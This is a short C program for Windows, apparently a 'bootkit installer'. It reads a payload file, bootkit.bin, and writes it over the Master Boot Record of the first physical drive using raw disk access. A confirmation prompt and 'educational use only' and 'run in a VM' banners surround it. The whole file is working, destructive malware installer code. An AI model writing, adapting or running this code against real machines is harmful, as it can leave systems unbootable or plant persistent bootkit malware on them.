#include <windows.h>
#include <stdio.h>

BOOL WriteMBR(LPCSTR drivePath, BYTE* bootSectorData, DWORD dataSize) {
    HANDLE hDrive = CreateFileA(drivePath, GENERIC_WRITE, FILE_SHARE_WRITE,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive == INVALID_HANDLE_VALUE) {
        printf("Error: Cannot open drive. Run as Administrator.\n");
        return FALSE;
    }

    DWORD bytesWritten;
    SetFilePointer(hDrive, 0, NULL, FILE_BEGIN);
    BOOL result = WriteFile(hDrive, bootSectorData, dataSize, &bytesWritten, NULL);
    CloseHandle(hDrive);
    
    if (!result || bytesWritten != dataSize) {
        printf("Error: Failed to write MBR.\n");
        return FALSE;
    }
    return TRUE;
}

BOOL InstallBootkit() {
    HANDLE hFile = CreateFileA("bootkit.bin", GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error: bootkit.bin not found!\n");
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* bootSector = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, bootSector, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    printf("WARNING: This will modify the Master Boot Record!\n");
    printf("Only run in a VM!\n");
    printf("Continue? (y/n): ");
    
    char confirm;
    scanf(" %c", &confirm);
    if (confirm != 'y' && confirm != 'Y') {
        printf("Installation cancelled.\n");
        free(bootSector);
        return FALSE;
    }

    BOOL result = WriteMBR("\\\\.\\PhysicalDrive0", bootSector, bytesRead);
    free(bootSector);
    
    if (result) {
        printf("Bootkit installed successfully!\n");
        printf("Reboot to activate.\n");
    }
    return result;
}

int main() {
    printf("========================================\n");
    printf("   BOOTKIT INSTALLER v1.0\n");
    printf("   FOR EDUCATIONAL USE ONLY!\n");
    printf("========================================\n\n");
    InstallBootkit();
    return 0;
}
